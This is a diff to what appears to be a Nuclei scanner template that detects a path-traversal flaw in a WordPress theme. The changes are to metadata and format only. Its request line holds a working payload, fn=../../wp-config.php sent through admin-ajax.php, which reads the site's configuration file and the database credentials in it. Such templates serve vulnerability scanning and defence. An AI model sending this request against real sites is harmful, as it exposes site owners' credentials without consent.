@@ -13,9 +13,11 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
     cwe-id: CWE-22
-  tags: wordpress,wp-theme,lfi,wp
+  metadata:
+    max-request: 1
+  tags: wordpress,wp-theme,lfi,wp,wpscan,vuln
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-admin/admin-ajax.php?jvfrm_spot_get_json&fn=../../wp-config.php&callback=jQuery'
@@ -32,5 +34,4 @@ requests:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/07/29
+# digest: 4b0a004830460221009018aa4a8533318f97b9c211db003abf8ab5ecc6e1129a86480b852752ebfae4022100c30ddb0412ed93fe1293c3f0d355f3b2326fe13007bdf29cd0c8f7ac1a3fbdb3:922c64590222798bb761d5b6d8e72950
